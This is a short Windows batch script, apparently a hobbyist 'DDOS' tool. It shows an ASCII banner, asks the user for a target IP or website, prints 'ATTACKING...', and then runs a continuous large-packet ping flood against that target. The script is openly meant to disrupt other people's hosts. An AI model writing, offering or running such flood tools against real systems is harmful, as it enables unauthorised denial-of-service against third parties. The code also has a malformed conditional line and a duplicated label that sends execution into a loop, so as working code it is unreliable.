@echo off
chcp 65001 >nul
goto banner
pause

:banner
echo.
echo.
echo              ██████╗ ██████╗  ██████╗ ███████╗
echo              ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
echo              ██║  ██║██║  ██║██║   ██║███████╗
echo              ██║  ██║██║  ██║██║   ██║╚════██║
echo              ██████╔╝██████╔╝╚██████╔╝███████║
echo              ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
echo.                       DDOS BY Ido
echo.
echo.
set /p input= Enter IP/Website Here: 
if %input%==goto A if NOT B
ping localhost>nul
echo ATTACKING...
ping localhost>nul
cls
color 02
goto banner
:banner
echo.
echo.
echo              ██████╗ ██████╗  ██████╗ ███████╗
echo              ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
echo              ██║  ██║██║  ██║██║   ██║███████╗
echo              ██║  ██║██║  ██║██║   ██║╚════██║
echo              ██████╔╝██████╔╝╚██████╔╝███████║
echo              ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
echo                        DDOS BY Ido
echo.
echo              --------------------------------
echo               DO CTRL + C TO END THE ATTACK
echo              --------------------------------
ping %input% -t -l 1000